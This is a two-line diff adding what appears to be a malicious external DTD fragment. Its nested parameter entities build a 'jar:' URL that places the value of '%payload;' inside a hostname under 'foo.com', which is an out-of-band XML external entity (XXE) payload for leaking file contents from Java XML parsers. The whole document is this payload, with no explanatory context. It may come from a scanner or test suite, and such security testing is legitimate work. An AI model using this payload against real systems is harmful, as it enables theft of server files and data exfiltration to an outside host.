@@ -1,0 +1,2 @@
+<!ENTITY % result "<!ENTITY &#x25; run SYSTEM 'jar:%payload;.foo.com!/'>">
+%result;
